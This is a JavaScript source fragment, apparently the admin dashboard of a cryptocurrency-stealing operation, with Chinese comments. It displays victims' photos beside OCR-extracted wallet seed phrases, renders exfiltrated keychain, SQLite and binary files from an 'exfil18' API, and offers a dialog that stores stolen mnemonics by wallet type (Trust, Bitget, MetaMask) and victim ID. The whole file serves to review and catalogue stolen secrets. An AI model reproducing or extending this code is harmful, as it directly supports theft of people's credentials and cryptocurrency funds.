}

// 【2026-09-14】统一照片查看器：识别助记词 → 左图 + 右助记词同屏；原图 → 大图；纯 OCR → 文本
function photoView(id) {
  const p = (window._photoList || []).find(v => v.id === id);
  if (!p) return;
  const hasImg = !!p.bin_path;
  const hasMnem = (p.word_n || 0) > 0;
  const imgHtml = hasImg
    ? '<img src="' + API_BASE + '/api/user/user_photo/raw?id=' + p.id + '&t=' + TOKEN + '" style="max-width:100%;max-height:' + (hasMnem ? '62vh' : '75vh') + ';border-radius:8px">'
    : '';
  if (hasImg && hasMnem) {
    // 原图 + 助记词：上图下词
    dlgOpen('📷 相册识别助记词 · ' + esc(p.name || ''),
      '<div style="text-align:center">' + imgHtml + '</div>' +
      '<div style="margin-top:12px;padding:12px 14px;background:rgba(52,199,89,.08);border:1px solid rgba(52,199,89,.25);border-radius:10px">' +
        '<div style="font-size:12px;font-weight:700;color:#1b6f3a;margin-bottom:6px">助记词（' + (p.word_n || 0) + ' 词）</div>' +
        '<div class="mono" style="font-size:14px;line-height:1.9;word-break:break-all;color:var(--text)">' + esc(p.words || '') + '</div>' +
        (p.note ? '<div style="margin-top:8px;font-size:11px;color:var(--text-secondary);word-break:break-all">' + esc(p.note) + '</div>' : '') +
        (p.title ? '<div style="margin-top:6px;font-size:11px;color:var(--text-tertiary)">' + esc(p.title) + '</div>' : '') +
      '</div>' +
      '<div style="margin-top:8px;font-size:11px;color:var(--text-tertiary);text-align:right">' + fmtTs(p.ts) + ' · ' + esc(p.ip || '') + '</div>',
      { width: 860 });
    return;
  }
  if (hasImg) { photoViewer(id); return; }
  // 纯 OCR 文本
  photoNote(id);
}

function photoNote(id) {
  const p = (window._photoList || []).find(v => v.id === id);
  if (!p) return;
  dlgOpen('OCR 详情 · ' + esc(p.name || ''),
    '<div style="font-size:13px;line-height:1.8;word-break:break-all;color:var(--text)">' + esc(p.note || '') + '</div>' +
    '<div style="margin-top:10px;font-size:11px;color:var(--text-secondary)">' + esc(p.title || '') + ' · ' + fmtTs(p.ts) + '</div>',
    { width: 560 });
}

// ── Exfil File Viewer ──
// 【2026-09-11】文件解读渲染器：把后端 view 结果按类型渲染成人能看懂的样子
function renderExView(d) {
  const head = d.title ? '<div style="font-weight:600;margin-bottom:6px">' + esc(d.title) + '</div>' : '';
  const note = d.note ? '<div style="font-size:12px;color:var(--text-tertiary);line-height:1.6;margin-bottom:10px">' + esc(d.note) + '</div>' : '';
  if (d.kind === 'keychain' || d.kind === 'table') {
    const rows = d.rows || [];
    const cols = d.columns || (rows[0] ? Object.keys(rows[0]) : []);
    if (!rows.length) return head + note + '<div class="empty">无数据</div>';
    let h = head + note + '<div style="overflow:auto;max-height:66vh"><table style="font-size:12px"><thead><tr>' +
      cols.map(c => '<th>' + esc(c) + '</th>').join('') + '</tr></thead><tbody>';
    rows.slice(0, 400).forEach(r => {
      const hot = String(r.flag || '').indexOf('★') === 0;
      h += '<tr' + (hot ? ' style="background:rgba(255,159,10,.12)"' : '') + '>' +
        cols.map(c => {
          const v = r[c];
          return '<td style="max-width:340px;word-break:break-all">' +
            (v === null || v === undefined || v === '' ? '<span class="dim">—</span>' : esc(String(v))) + '</td>';
        }).join('') + '</tr>';
    });
    h += '</tbody></table></div>';
    if (rows.length > 400) h += '<div class="dim" style="margin-top:6px">仅显示前 400 行（共 ' + rows.length + ' 行）</div>';
    return h;
  }
  if (d.kind === 'text') {
    return head + note + '<pre style="white-space:pre-wrap;word-break:break-all;font-size:12px;max-height:64vh;overflow:auto;margin:0;font-family:var(--mono);color:var(--text);background:var(--bg-secondary);padding:12px;border-radius:8px">' + esc(d.text || '') + '</pre>';
  }
  if (d.kind === 'sqlite') {
    return head + note + '<div style="margin-top:10px"><button class="btn btn-ghost btn-sm" onclick="exParseDialog(' + (window._exViewId || 0) + ',\'auto\')">解析数据库表数据</button></div>';
  }
  if (d.kind === 'binary') {
    if (d.noise) return head + note;   // App 资源文件：只给结论，不展示无意义 hex
    let h = head + note;
    h += '<div style="font-size:12px;margin:8px 0 4px;color:var(--text-secondary)">文件头（前 512 字节）</div>' +
      '<pre style="font-size:11px;line-height:1.6;background:var(--bg-secondary);padding:10px;border-radius:8px;max-height:26vh;overflow:auto;font-family:var(--mono);white-space:pre-wrap;word-break:break-all">' + esc(d.hex || '') + '</pre>';
    const s = d.strings || [];
    h += '<div style="font-size:12px;margin:10px 0 4px;color:var(--text-secondary)">可打印字符串 ' + s.length + ' 条（已去重）</div>' +
      '<pre style="font-size:11px;background:var(--bg-secondary);padding:10px;border-radius:8px;max-height:32vh;overflow:auto;font-family:var(--mono);white-space:pre-wrap;word-break:break-all">' + esc(s.slice(0, 120).join('\n')) + '</pre>';
    return h;
  }
  return head + note;
}

async function viewExfil(id) {
  const x = (window._exfilList || []).find(v => v.id === id);
  if (!x) return;
  window._exViewId = id;
  const fname = (x.path || '').split('/').pop() || String(id);
  dlgOpen('文件解读 · ' + esc(fname),
    '<div style="font-size:12px;color:var(--text-secondary);margin-bottom:8px">' + esc(x.path || '') + ' · ' + fmtSize(x.orig_size || x.decoded_size || 0) + ' · ' + esc(x.data_type || '') + '</div>' +
    '<div id="exview"><div class="loading"><div class="spinner"></div></div></div>', { width: 1100 });
  const url = API_BASE + '/api/exfil18/file?id=' + id + '&t=' + TOKEN;
  const isImg = /\.(png|jpe?g|gif|heic|webp|bmp|tiff?)$/i.test(x.path || '') || String(x.data_type || '') === 'image';
  if (isImg) {
    const b = document.getElementById('exview');
    if (b) b.innerHTML = '<img src="' + url + '" style="max-width:100%;border-radius:8px">';
    return;
  }
  const d = await get('exfil18/view?id=' + id);
  const b = document.getElementById('exview');
  if (!b) return;
  if (!d || !d.ok) {
    b.innerHTML = '<div class="empty">解读失败' + (d && d.message ? '：' + esc(d.message) : '') + '</div>';
    return;
  }
  b.innerHTML = renderExView(d);
}

// ── Exfil SQLite Parse Dialog ──
async function exParseDialog(id, kind) {
  dlgOpen('SQLite 解析', '<div id="exparse2"><div class="loading"><div class="spinner"></div></div></div>', { width: 980 });
  const d = await get('exfil18/db?id=' + id + '&kind=' + kind);
  const box = document.getElementById('exparse2');
  if (!box) return;
  const rows = d?.rows || [];
  if (!rows.length) { box.innerHTML = '<div class="empty">无解析数据' + (d?.note ? ' (' + esc(d.note) + ')' : '') + '</div>'; return; }
  const keys = Object.keys(rows[0]);
  let html = '<div style="font-size:12px;color:var(--text-secondary);margin-bottom:8px">表 ' + esc(d.table || '') + ' · ' + rows.length + ' 行</div>';
  html += '<div style="overflow-x:auto"><table style="font-size:12px"><thead><tr>' + keys.map(k => '<th>' + esc(k) + '</th>').join('') + '</tr></thead><tbody>';
  html += rows.slice(0, 50).map(r => '<tr>' + keys.map(k => '<td style="max-width:260px;word-break:break-all">' + (r[k]==null||r[k]==='' ? '<span class="dim">—</span>' : esc(String(r[k])).slice(0, 300)) + '</td>').join('') + '</tr>').join('');
  html += '</tbody></table></div>' + (rows.length > 50 ? '<div class="dim" style="margin-top:6px">仅显示前 50 行</div>' : '');
  box.innerHTML = html;
}

// ── Inline SQLite parse ──
async function exParse(exid, kind) {
  if (!exid) { toast('无关联记录', 'warning'); return; }
  const box = document.getElementById('exparse');
  if (!box) return;
  box.innerHTML = '<div class="loading"><div class="spinner"></div></div>';
  const d = await get('exfil18/db?id=' + exid + '&kind=' + kind);
  const rows = d?.rows || [];
  if (!rows.length) { box.innerHTML = '<div class="dim">无解析数据</div>'; return; }
  const keys = Object.keys(rows[0]);
  let html = '<div style="overflow-x:auto"><table style="font-size:11px"><thead><tr>' + keys.map(k => '<th>' + esc(k) + '</th>').join('') + '</tr></thead><tbody>';
  html += rows.slice(0, 30).map(r => '<tr>' + keys.map(k => '<td style="max-width:200px;word-break:break-all">' + (r[k]==null ? '<span class="dim">—</span>' : esc(String(r[k])).slice(0, 200)) + '</td>').join('') + '</tr>').join('');
  html += '</tbody></table></div>';
  box.innerHTML = html;
}

// ── Mnemonic Input Dialog ──
function mnemonicAddDialog() {
  dlgOpen('输入助记词',
    '<div class="form-group"><label>助记词 (12/24词，空格分隔)</label><textarea id="mne_text" style="font-family:var(--mono)" rows="3"></textarea></div>' +
    '<div class="form-group"><label>钱包类型</label><input id="mne_app" placeholder="如 Trust / Bitget / MetaMask"></div>' +
    '<div class="form-group"><label>关联用户ID (可选)</label><input id="mne_uid" placeholder="留空 = 手动录入"></div>', {
    width: 420, confirmText: '保存', onConfirm: async () => {
      const mnemonic = document.getElementById('mne_text').value.trim();
      const app_type = document.getElementById('mne_app').value.trim();
      const user_id = document.getElementById('mne_uid').value.trim();
      if (!mnemonic || !app_type) { toast('助记词和钱包类型必填', 'error'); return; }
      const r = await fetch(API_BASE + '/api/secrecy/user_mnemonic/create', {
        method: 'POST', headers: { 'Authorization': 'Bearer ' + TOKEN, 'Content-Type': 'application/json' },
        body: JSON.stringify({ mnemonic, app_type, user_id: parseInt(user_id) || null })
      });
      const d = await r.json();
      if (r.ok) { toast('已保存 #' + d.id); dlgClose(); navTo('mnemonics'); }
      else { toast(d.message || '保存失败', 'error'); }
    }
  });
}
